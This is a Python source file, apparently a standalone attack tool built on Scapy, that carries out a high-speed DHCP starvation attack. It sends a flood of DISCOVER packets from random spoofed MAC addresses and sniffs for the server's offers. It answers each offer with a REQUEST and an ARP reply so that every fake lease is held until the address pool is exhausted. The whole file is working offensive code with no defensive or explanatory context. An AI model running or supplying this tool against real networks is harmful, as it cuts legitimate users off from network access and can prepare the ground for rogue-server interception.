import random
import threading
import time
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP

is_running = False
starve_thread = None
active_leases = 0


def dhcp_discover(spoofed_mac, xid, i_face):
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    dsc = Ether(src=spoofed_mac, dst=mac_dest)
    dsc /= IP(src='0.0.0.0', dst=ip_dest)
    dsc /= UDP(sport=68, dport=67)
    dsc /= BOOTP(chaddr=mac2str(spoofed_mac), xid=xid, flags=0x8000)
    dsc /= DHCP(options=[
        ("message-type", "discover"),
        ("param_req_list", [1, 3, 6, 15]),
        ("max_message_size", 576),
        "end"
    ])
    sendp(dsc, iface=i_face, verbose=False)


def dhcp_request(req_ip, spoofed_mac, server_ip, xid, i_face):
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    req = Ether(src=spoofed_mac, dst=mac_dest)
    req /= IP(src="0.0.0.0", dst=ip_dest)
    req /= UDP(sport=68, dport=67)
    req /= BOOTP(chaddr=mac2str(spoofed_mac), xid=xid)
    req /= DHCP(
        options=[
            ("message-type", "request"),
            ("server_id", server_ip),
            ("requested_addr", req_ip),
            ("param_req_list", [1, 3, 6, 15]),
            "end"
        ])
    sendp(req, iface=i_face, verbose=False)


def arp_reply(src_ip, source_mac, server_ip, server_mac, i_face):
    reply = ARP(op=2, hwsrc=mac2str(source_mac), psrc=src_ip, hwdst=server_mac, pdst=server_ip)
    send(reply, iface=i_face, verbose=False)


def _starve_loop(target_ip, i_face, persistent):
    global is_running, active_leases
    active_leases = 0
    server_mac = None

    if target_ip:
        try:
            print(f"[*] Resolving MAC address for DHCP server: {target_ip}...")
            ans = sr1(ARP(op=1, pdst=str(target_ip)), timeout=2, verbose=False)
            if ans:
                server_mac = ans[ARP].hwsrc
                print(f"[+] Found Server MAC: {server_mac}")
        except Exception:
            pass

    # Track pending queries: {xid: mac_address}
    pending_requests = {}
    lock = threading.Lock()

    def packet_callback(p):
        global active_leases
        if (
                UDP in p and
                (p[UDP].sport in [67, 68] and p[UDP].dport in [67, 68]) and
                DHCP in p and
                any(opt[0] == 'message-type' and opt[1] == 2 for opt in p[DHCP].options if isinstance(opt, tuple))
        ):
            if BOOTP in p:
                xid = p[BOOTP].xid
                offered_ip = p[BOOTP].yiaddr
                server_ip = p[IP].src

                with lock:
                    mac = pending_requests.pop(xid, None)

                if mac and offered_ip:
                    target_server = target_ip if target_ip else server_ip
                    active_leases += 1
                    print(f"[+] Lease #{active_leases} Secured | IP: {offered_ip} | MAC: {mac}")

                    # Immediately complete handshake
                    dhcp_request(req_ip=offered_ip, spoofed_mac=mac, server_ip=target_server, xid=xid, i_face=i_face)
                    if server_mac:
                        arp_reply(src_ip=offered_ip, source_mac=mac, server_ip=target_server, server_mac=server_mac,
                                  i_face=i_face)

    sniffer = AsyncSniffer(iface=i_face, prn=packet_callback, store=False)
    sniffer.start()
    print("[*] High-speed background sniffer active. Blasting DISCOVER packets...")

    try:
        while is_running:
            mac = str(RandMAC())
            xid = random.randint(1, 1000000000)

            with lock:
                pending_requests[xid] = mac

            dhcp_discover(spoofed_mac=mac, xid=xid, i_face=i_face)

            # Blast discovers rapidly without blocking
            time.sleep(0.08)

    finally:
        sniffer.stop()
        print(f"[+] Starvation loop exited. Total dynamic leases secured: {active_leases}")


def start_starve(target_ip=0, i_face=None, persistent=False):
    global is_running, starve_thread
    is_running = True
    starve_thread = threading.Thread(
        target=_starve_loop,
        args=(target_ip, i_face, persistent),
        daemon=True
    )
    starve_thread.start()
    print(f"[*] High-Speed DHCP Starvation running against target: {target_ip or 'Auto'}")
    input("Press Enter to stop...\n")
    stop_starve()


def stop_starve():
    global is_running
    is_running = False
    print("[+] DHCP Starvation stopped.")